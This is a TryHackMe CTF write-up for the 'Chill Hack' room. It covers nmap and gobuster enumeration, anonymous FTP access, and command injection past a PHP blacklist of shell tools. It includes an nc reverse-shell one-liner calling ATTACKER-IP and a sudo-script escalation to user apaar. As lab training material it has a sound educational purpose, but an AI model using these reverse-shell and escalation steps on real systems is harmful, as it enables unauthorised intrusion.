---
title : "TryHackMe: Chill Hack WriteUp - PART 1"
author : Seif-Allah
description : "TryHackMe: WriteUp for the Chill Hack room (Level: Medium)"
layout : post
category: CTF-WriteUp
tags : [THM,TryHackMe,WriteUp,Chill Hack,Medium,CTF]
image : /assets/images/writeups/thm/chillhack/chillhack.png
---
### Enumeration
Classic Nmap scan : 
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
```
First things first, I start enumerating the FTP port wishing that it accepts anonymous login:
```bash
ftp 10.10.146.220
Connected to 10.10.146.220.
220 (vsFTPd 3.0.3)
Name (10.10.146.220:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03 04:33 .
drwxr-xr-x    2 0        115          4096 Oct 03 04:33 ..
-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (703.1249 kB/s)
```
As you can see,It accepts anonymous login, :WEEY: So I list all the files and it contains a *note.txt* file. 
I download it using the *get* command. 
```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
Well, that sounds cool, we got a hint, there's some filtration out there for strings. (Hope that it's not a rabbit hole), and we got 2 usernames. (We can start a bruteforce attack using hydra on the ssh but not for now, we need some more enumeration).

Let's move on for the HTTP server:
![HTTP Server](/assets/images/writeups/thm/Chill hack/HTTP_server.png)
Nothing too fancy here, just some random theme running. 

So I ran *gobuster* for some directory searching.
After some minutes of directory bruteforcing here's the result : 
```bash
root@kali:~/Documents/thm/game_info# gobuster dir -u http://10.10.146.220/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 2>/dev/null 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.146.220/
[+] Threads:        200
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/18 07:29:47 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/secret (Status: 301)
```
Well, as it's in easy level, that was kinda expected.
There's a */secret* directory. 
Let's check it inside our browser : 
![/secret](/assets/images/writeups/thm/chillhack/secret_directory.png)
Hmm, a field expecting a command and an execute button, with a silly animation ! 
Let's execute an *ls* command and see what happens ? 
![/hacker](/assets/images/writeups/thm/chillhack/hacker.png)
So, there's some filtration for some commands like ls.
I tried *cat*, *python* and *nc* commands but they're all filtered. 
I tried to split the commands with a semicolon but nothing changed. 
So my final thought is that it filters some the string entered as an input.
My first idea is to try a reverse shell found in [highon coffee blog](https://highon.coffee/blog/reverse-shell-cheat-sheet/) : 
```
mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```
![reverse](/assets/images/writeups/thm/chillhack/reverse.png)
Looking at the index.php file found in the /var/www/html/secret directory, I found that my guessing was true, there's a blacklist array which contains some commands that are gonna filtered later. 
```
$cmd = $_POST['command'];
$store = explode(" ",$cmd);
$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
```
Let's spawn a tty shell and move on.
Looking at the home directory, I found that there's a directory called *apaar* (remember the hint ?).
After checking it, I found a local.txt file which I don't have permission to read and a .helpline.sh file which can be run as apaar (after checking *sudo -l*) 
```
User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```
Reading the code, it looks like it executes whatever we type and redirects the error the /dev/null, so I executed */bin/bash* to get a shell from the user *apaar* and run any command we want !
```
www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: seif
seif
Hello user! I am seif,  Please enter your message: /bin/bash
/bin/bash
ls
ls
local.txt
whoami
whoami
apaar
cat local.txt
cat local.txt
{USER-FLAG: REDACTED-REDACTED-REDACTED}
```
Bingo ! We got the first flag 
